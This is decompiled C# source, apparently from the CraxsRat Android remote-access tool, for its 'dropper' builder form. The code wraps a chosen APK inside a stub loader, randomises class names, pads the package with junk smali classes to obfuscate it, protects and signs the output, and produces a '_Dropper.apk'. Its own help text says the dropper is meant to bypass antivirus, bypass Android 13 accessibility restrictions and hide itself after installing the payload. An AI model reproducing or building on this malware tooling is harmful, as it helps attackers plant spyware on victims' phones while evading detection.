	private void WorkWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			log("Starting...");
			while (HoldExtract)
			{
				S();
			}
			log("Extracting...");
			string driv = Codes.GetDriv();
			WorkDIR = driv + "CraxsRat_Drop";
			STUBPATH = WorkDIR + "\\STUB";
			outputpath = WorkDIR + "\\out";
			buildapkpath = outputpath + "\\temp.apk";
			while (true)
			{
				if (Directory.Exists(WorkDIR))
				{
					if (!firsttry)
					{
						firsttry = true;
						Codes.DirectoryDeleteLong(WorkDIR);
						Thread.Sleep(3000);
						continue;
					}
					WorkDIR = Codes.GenerateRandomFolderName("drop");
					break;
				}
				Directory.CreateDirectory(WorkDIR);
				Directory.CreateDirectory(WorkDIR + "\\tools");
				Directory.CreateDirectory(STUBPATH);
				Directory.CreateDirectory(outputpath);
				break;
			}
			apktoolpath = WorkDIR + "\\tools\\apktool.jar";
			Apksignerpath = WorkDIR + "\\tools\\signapk.jar";
			ApkZIPpath = WorkDIR + "\\tools\\zipalign.exe";
			Apkeditorpath = WorkDIR + "\\tools\\ApkEditor.jar";
			C = WorkDIR + "\\tools\\certificate.pem";
			K = WorkDIR + "\\tools\\key.pk8";
			File.WriteAllBytes(apktoolpath, Resources.apktool);
			File.WriteAllBytes(Apksignerpath, Resources.signapk);
			File.WriteAllBytes(ApkZIPpath, Resources.zipalign);
			File.WriteAllBytes(Apkeditorpath, Resources.APKEditor);
			File.WriteAllBytes(STUBPATH + "\\drop.zip", Resources.dropstub);
			ZipFile.ExtractToDirectory(STUBPATH + "\\drop.zip", STUBPATH);
			S();
			File.Delete(STUBPATH + "\\drop.zip");
			log("loading payload...");
			assetspath = STUBPATH + "\\assets";
			BASEPATH = assetspath + "\\childapp.apk";
			if (File.Exists(BASEPATH))
			{
				File.Delete(BASEPATH);
			}
			File.Copy(TargetAPKPATH, BASEPATH);
			stringspath = STUBPATH + "\\res\\values\\strings.xml";
			MainfistPath = STUBPATH + "\\AndroidManifest.xml";
			stubicon = STUBPATH + "\\res\\drawable\\myicon.png";
			log("loading data...");
			string contents = File.ReadAllText(stringspath).Replace("[MY-NAME]", textappname.Text);
			File.WriteAllText(stringspath, contents);
			File.Delete(stubicon);
			File.Copy(TargetApkicon, stubicon);
			log("Encoding");
			ClassesPath = STUBPATH + "\\smali\\com\\appd\\instll";
			string newValue = "com";
			string text = "appd";
			string text2 = "instll";
			string[] files = Directory.GetFiles(STUBPATH + "\\smali\\com\\appd\\instll");
			if (!File.Exists(reso.Junkpath))
			{
				File.WriteAllBytes(reso.Junkpath, Resources.junk);
			}
			string text3 = File.ReadAllText(reso.Junkpath);
			N_Class1 = RandommMadv2(30);
			N_Class2 = RandommMadv2(30);
			N_Class3 = RandommMadv2(30);
			N_Class4 = RandommMadv2(30);
			N_Class5 = RandommMadv2(30);
			string contents2 = File.ReadAllText(MainfistPath).Replace(ClassGen1, N_Class1).Replace(ClassGen2, N_Class2)
				.Replace(ClassGen3, N_Class3)
				.Replace(ClassGen4, N_Class4)
				.Replace(ClassGen5, N_Class5);
			File.WriteAllText(MainfistPath, contents2);
			string[] array = files;
			foreach (string path in array)
			{
				string contents3 = File.ReadAllText(path).Replace("[T_ID]", textpkgname.Text).Replace(ClassGen1, N_Class1)
					.Replace(ClassGen2, N_Class2)
					.Replace(ClassGen3, N_Class3)
					.Replace(ClassGen4, N_Class4)
					.Replace(ClassGen5, N_Class5);
				File.WriteAllText(path, contents3);
			}
			int num = 1;
			do
			{
				string text4 = RandommMadv2(30);
				File.WriteAllText(ClassesPath + "\\" + text4 + ".smali", text3.Replace("spymax", newValue).Replace("stub7", text + "/" + text2).Replace("[MYNAME]", text4));
				num = checked(num + 1);
			}
			while (num <= 50);
			S();
			S();
			S();
			log("Building Dropper...");
			ExecuteCommand("java -jar " + apktoolpath + " b -f " + STUBPATH + " -o " + buildapkpath);
			do
			{
				S();
			}
			while (Waitbuild);
			log("Zip Align..");
			string command = ApkZIPpath + " 4 \"" + buildapkpath + "\" \"" + buildapkpath.Replace("temp.apk", "temp_zip.apk") + "\"";
			string text5 = buildapkpath.Replace("temp.apk", "temp_zip.apk");
			ExecuteCommand(command);
			do
			{
				S();
			}
			while (!File.Exists(text5) | Codes.FileInUse(text5));
			File.Delete(buildapkpath);
			log("Protect Dropper..");
			string text6 = text5.Replace(".apk", "_protected.apk");
			string command2 = "java -jar " + Apkeditorpath + " p  -i \"" + text5 + "\"";
			ExecuteCommand(command2);
			do
			{
				S();
			}
			while (Waitprotect | Codes.FileInUse(text6));
			File.Delete(text5);
			log("Signing Dropper..");
			File.WriteAllBytes(C, Resources.C2);
			File.WriteAllBytes(K, Resources.K2);
			S();
			string text7 = outputpath + "\\" + originalapkname.Replace(".apk", "_Dropper.apk");
			string command3 = "java -jar \"" + Apksignerpath + "\" sign --key \"" + K + "\" --cert \"" + C + "\"  --v2-signing-enabled true --v3-signing-enabled true --out \"" + text7 + "\" \"" + text6 + "\"";
			ExecuteCommand(command3);
			do
			{
				S();
			}
			while (!File.Exists(text7) | Codes.FileInUse(text7) | Codes.FileInUse(text6));
			File.Delete(text6);
			log("finishing...");
			S();
			log("5");
			S();
			log("4");
			S();
			log("3");
			S();
			log("2");
			S();
			log("1");
			S();
			Process.Start(outputpath);
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				Close();
				StopCommandPrompt();
			}));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (Codes.MyMsgBox("Drooper Error", ex2.Message, useno: false, Resources.error48px))
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					Close();
				}));
			}
			ProjectData.ClearProjectError();
		}
	}

	private void StopCommandPrompt()
	{
		try
		{
			if (cmdProcess != null)
			{
				ExecuteCommand("EXIT");
				S();
				cmdProcess.CloseMainWindow();
				cmdProcess.Close();
				cmdProcess.Dispose();
				cmdProcess = null;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string RandommMadv2(int minCharacters)
	{
		string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
		if (rshit == null)
		{
			rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[rshit.Next(0, text.Length - 1)]);
			}
			cou++;
			return text2.ToString().ToLower() + Conversions.ToString(cou);
		}
	}

	private void ExecuteCommand(string command)
	{
		cmdProcess.StandardInput.WriteLine(command);
		cmdProcess.StandardInput.Flush();
	}

	private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
	{
		if (!string.IsNullOrEmpty(e.Data))
		{
			string data = e.Data;
			if (data.Contains("java"))
			{
				log(data);
			}
			if (data.Contains("[PROTECT] Saved to"))
			{
				Waitprotect = false;
			}
			if (data.StartsWith("I:"))
			{
				log(data.Replace("I:", ""));
			}
			if (data.Contains("[PROTECT]") && !data.Contains("Writing:"))
			{
				log(data);
			}
			else if (data.Contains("Built apk"))
			{
				Waitbuild = false;
			}
			else if (data.StartsWith("E:"))
			{
				log(data.Replace("E:", "Error:"));
			}
			if ((data.Contains("Java(TM)") | data.Contains("OpenJDK")) && !FoundJava)
			{
				FoundJava = true;
				HoldExtract = false;
			}
		}
	}

	private void Drooper_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				Codes.MyMsgBox("info", "dropper is like loader , it hold your apk inside of it ,and when user opens it, it will ask user to install your app , why? :\r\n1: Clean loader hold the apk to bypass antivirus\r\n2: Help to Bypass android 13 Accessibility restriction\r\n3: Hide itself after dropping the payload \r\n", useno: false, Resources.information48px);
			}
			else
			{
				Codes.MyMsgBox("info", "المثبت مثل أداة التحميل ، فهو يحمل ملف apk بداخله ، وعندما يفتحه المستخدم ، سيطلب من المستخدم تثبيت تطبيقك ، لماذا؟ :\r\n1: محمل نظيف يحمل apk لتجاوز مكافحة الفيروسات\r\n2: المساعدة في تجاوز قيود إمكانية الوصول لنظام Android 13\r\n3: إخفاء نفسه بعد تثبيت apk", useno: false, Resources.information48px);
			}
		}
		else
		{
			Codes.MyMsgBox("info", "安装程序就像加载程序，它将您的apk保存在其中，当用户打开它时，它会要求用户安装您的应用程序，为什么？ :\r\n1: Clean loader 保留 apk 以绕过防病毒软件\r\n2：帮助绕过android 13辅助功能限制\r\n3：安装apk后隐藏自身", useno: false, Resources.information48px);
		}
	}

	private void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				selectapkbtn.Text = "选择一个文件";
				labelname.Text = "应用名称";
				Button1.Text = "选择图像";
				Button3.Text = "什么是安装程序？";
				Button2.Text = "建造";
			}
		}
		else
		{
			selectapkbtn.Text = "إختيار تطبيق";
			labelname.Text = "اسم التطبيق";
			Button1.Text = "اختيار صورة";
			Button3.Text = "ما هو المثبت؟";
			Button2.Text = "بناء";
		}
	}

	private void Drooper_Load(object sender, EventArgs e)
	{
		Translateme();
	}
}
